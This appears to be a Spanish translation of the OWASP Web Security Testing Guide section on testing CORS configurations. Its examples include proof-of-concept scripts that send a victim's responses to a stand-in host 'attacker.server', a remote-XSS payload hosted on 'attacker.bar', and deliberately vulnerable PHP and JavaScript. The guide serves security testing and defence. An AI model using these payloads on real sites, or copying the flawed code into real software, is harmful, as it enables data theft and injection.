# Intercambio de recursos de origen cruzado

|ID          |
|------------|
|WSTG-CLNT-07|

## Resumen

[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) es un mecanismo que permite a un navegador web realizar solicitudes entre dominios mediante la API XMLHttpRequest (XHR) Level 2 (L2) de manera controlada. En el pasado, la API XHR L1 solo permitía enviar solicitudes dentro del mismo origen, ya que estaba restringida por la [Política del mismo origen](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy) (SOP).

Las solicitudes de origen cruzado tienen un encabezado `Origin` que identifica el dominio que inicia la solicitud y que siempre se envía al servidor. CORS define el protocolo que se utiliza entre un navegador web y un servidor para determinar si se permite una solicitud de origen cruzado. Para ello se utilizan [encabezados](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) HTTP.

El [estándar vivo Fetch de WHATWG (protocolo CORS)](https://fetch.spec.whatwg.org/#http-cors-protocol), que sustituye a la especificación CORS obsoleta del W3C, exige que, para las solicitudes no simples —como las solicitudes distintas de GET o POST, o las que utilizan credenciales—, se envíe previamente una solicitud OPTIONS de preflight para comprobar si el tipo de solicitud tendrá un efecto perjudicial en los datos. La solicitud de preflight comprueba los métodos y encabezados que permite el servidor, así como si se permiten credenciales. Según el resultado de la solicitud OPTIONS, el navegador decide si permite o no la solicitud.

### Origin y Access-Control-Allow-Origin

El encabezado de solicitud `Origin` siempre lo envía el navegador en una solicitud CORS e indica el origen de la solicitud. JavaScript no puede cambiar el encabezado Origin porque [el navegador (el agente de usuario) bloquea su modificación](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_request_header); sin embargo, no es buena idea confiar en este encabezado para las comprobaciones de control de acceso, ya que se puede falsificar fuera del navegador, por ejemplo, mediante un proxy. Por ello, sigue siendo necesario comprobar que se utilicen protocolos a nivel de aplicación para proteger los datos sensibles.

`Access-Control-Allow-Origin` es un encabezado de respuesta que utiliza el servidor para indicar qué dominios pueden leer la respuesta. Según la especificación CORS, corresponde al cliente determinar y aplicar la restricción que establece si tiene acceso a los datos de la respuesta, basándose en este encabezado.

Desde la perspectiva de las pruebas de seguridad, se deben buscar configuraciones inseguras, como utilizar el comodín `*` como valor del encabezado `Access-Control-Allow-Origin`, lo que significa que se permite el acceso a todos los dominios. Otro ejemplo de configuración insegura es que el servidor devuelva el encabezado de origen sin realizar comprobaciones adicionales, lo que puede permitir el acceso a datos sensibles. Esta configuración que permite solicitudes de origen cruzado es muy insegura y, por lo general, no es aceptable, excepto en el caso de una API pública destinada a ser accesible para todos.

### Access-Control-Request-Method y Access-Control-Allow-Method

El encabezado `Access-Control-Request-Method` se utiliza cuando un navegador realiza una solicitud OPTIONS de preflight y permite que el cliente indique el método de la solicitud final. Por otro lado, `Access-Control-Allow-Method` es un encabezado de respuesta que utiliza el servidor para describir los métodos que pueden utilizar los clientes.

### Access-Control-Request-Headers y Access-Control-Allow-Headers

Estos dos encabezados se utilizan entre el navegador y el servidor para determinar qué encabezados pueden usarse al realizar una solicitud de origen cruzado.

### Access-Control-Allow-Credentials

Este encabezado de respuesta permite a los navegadores leer la respuesta cuando se envían credenciales. Cuando se envía este encabezado, la aplicación web debe establecer un origen con el valor del encabezado `Access-Control-Allow-Origin`. El encabezado `Access-Control-Allow-Credentials` no se puede utilizar junto con el encabezado `Access-Control-Allow-Origin` cuyo valor sea el comodín `*`, como se muestra a continuación:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Validación de entrada

XHR L2 introduce, por compatibilidad con versiones anteriores, la posibilidad de crear una solicitud entre dominios mediante la API XHR. Esto puede introducir vulnerabilidades de seguridad que no estaban presentes en XHR L1. Entre los puntos del código que podrían explotarse se encuentran las URL que se pasan a XMLHttpRequest sin validación, especialmente si se permiten URL absolutas, ya que esto podría provocar una inyección de código. Asimismo, otra parte explotable de la aplicación es aquella en la que los datos de la respuesta no se escapan y el usuario puede controlarlos al proporcionar entradas.

### Otros encabezados

Hay otros encabezados relacionados, como `Access-Control-Max-Age`, que determina durante cuánto tiempo se puede almacenar en caché una solicitud de preflight en el navegador, o `Access-Control-Expose-Headers`, que indica qué encabezados es seguro exponer a la API de una especificación de API CORS.

Para revisar los encabezados CORS, consulta el [documento de CORS de MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#The_HTTP_response_headers).

## Objetivos de prueba

- Identificar endpoints que implementen CORS.
- Asegurarse de que la configuración de CORS sea segura o inocua.

## Cómo probar

Una herramienta como [ZAP](https://www.zaproxy.org) puede permitir que los evaluadores intercepten encabezados HTTP, lo que puede revelar cómo se utiliza CORS. Los evaluadores deben prestar especial atención al encabezado de origen para averiguar qué dominios están permitidos. Además, en algunos casos es necesario inspeccionar manualmente JavaScript para determinar si el código es vulnerable a la inyección de código debido a un manejo inadecuado de las entradas proporcionadas por el usuario.

### Configuración incorrecta de CORS

Establecer el comodín en el encabezado `Access-Control-Allow-Origin` (es decir, `Access-Control-Allow-Origin: *`) no es seguro si la respuesta contiene información sensible. Aunque no se puede utilizar junto con `Access-Control-Allow-Credentials: true`, puede ser peligroso cuando el control de acceso se realiza únicamente mediante reglas de firewall o direcciones IP de origen, en lugar de protegerse con credenciales.

#### Comodín Access-Control-Allow-Origin

Un evaluador puede comprobar si aparece `Access-Control-Allow-Origin: *` en los mensajes de respuesta HTTP.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

Si una respuesta contiene datos sensibles, un atacante puede robarlos mediante XHR:

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Política CORS dinámica

Una aplicación web moderna o una API puede implementarse para permitir dinámicamente solicitudes de origen cruzado, generalmente con el fin de permitir solicitudes desde subdominios, como en el siguiente ejemplo:

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

En este ejemplo, se permiten todas las solicitudes procedentes de los subdominios de example.com. Se debe asegurar que la expresión regular utilizada para la coincidencia esté completa. De lo contrario, si solo se buscara una coincidencia con `example.com` (sin añadir `$`), los atacantes podrían eludir la política CORS añadiendo su dominio al encabezado `Origin`.

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>
```

Si, al enviar la solicitud anterior, se devuelve la siguiente respuesta con un valor de `Access-Control-Allow-Origin` que coincide con la entrada del atacante, este podrá leer la respuesta y acceder a información sensible que solo está disponible para un usuario víctima.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

#### Valor null del origen incluido en la lista de permitidos

El encabezado `Origin` puede tener el valor `null` en situaciones específicas, como solicitudes iniciadas desde un archivo local, una redirección o un objeto serializado. En ocasiones, los desarrolladores incluyen el origen `null` en la lista de permitidos para facilitar el desarrollo local o admitir clientes que no sean web.

Sin embargo, el origen `null` funciona como un «comodín» que puede explotarse. Un atacante puede generar mediante programación una solicitud con el origen `null` utilizando un `iframe` en modo sandbox.

Si el servidor simplemente refleja el origen `null` en los encabezados de respuesta, especialmente cuando permite credenciales, se crea una vulnerabilidad similar a la del comodín genérico.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml
```

En un escenario de explotación, un atacante inserta un `iframe` en modo sandbox en su sitio malicioso. El atributo `sandbox` obliga al navegador a establecer en `null` el `Origin` de las solicitudes iniciadas desde el interior de ese frame.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://victim.site/sensitive-data', {
            method: 'GET',
            credentials: 'include' // Essential for sending cookies/auth headers
        })
        .then(response => response.text())
        .then(data => {
            // Exfiltrate data to attacker's server
            location.href = 'https://attacker.server/log?data=' + btoa(data);
        });
    </script>">
</iframe>
```

Como consecuencia, el navegador considera que la solicitud procede de `null`, el servidor permite `null` y el atacante consigue leer la respuesta sensible.

### Debilidad en la validación de entrada

El concepto CORS puede contemplarse desde un ángulo completamente distinto. Un atacante puede habilitar deliberadamente su política CORS para inyectar código en la aplicación web objetivo.

#### XSS remoto con CORS

Este código realiza una solicitud al recurso que aparece después del carácter `#` en la URL, inicialmente con el propósito de obtener recursos del mismo servidor.

Código vulnerable:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

Por ejemplo, una solicitud como esta mostrará el contenido del archivo `profile.php`:

`https://example.foo/main.php#profile.php`

Solicitud y respuesta generadas por `https://example.foo/profile.php`:

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Ahora, como no hay validación de URL, podemos inyectar un script remoto, que se inyectará y ejecutará en el contexto del dominio `example.foo`, con una URL como esta:

```text
https://example.foo/main.php#https://attacker.bar/file.php
```

Solicitud y respuesta generadas por `https://attacker.bar/file.php`:

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## Referencias

- [Hoja de referencia de seguridad HTML5 de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [Intercambio de recursos de origen cruzado en MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)